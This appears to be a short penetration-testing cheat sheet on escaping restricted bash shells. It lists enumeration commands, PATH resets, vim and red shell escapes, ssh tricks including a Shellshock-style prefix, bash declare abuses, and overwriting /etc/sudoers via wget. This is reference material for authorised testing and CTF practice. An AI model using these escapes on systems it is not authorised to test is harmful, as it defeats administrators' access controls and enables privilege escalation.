# Bash Jails

## Bash Jails

### Enumeration

First enumerate the best you can:

```bash
echo $SHELL
echo $PATH
env
export
pwd
```

### Modify PATH

Check if you can modify the PATH env variable

```bash
echo $PATH 
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin 
echo /home/* 
```

### Using vim

```bash
:set shell=/bin/sh
:shell
```

### Create script

Check if you can create an executable file with _/bin/bash_ as content

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

### Get bash from SSH

If you are accessing via ssh you can use this trick to execute a bash shell:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

### Declare

```bash
declare -n PATH; export PATH=/bin;bash -i
 
BASH_CMDS[shell]=/bin/bash;shell -i
```

### Wget

You can overwrite for example sudoers file

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
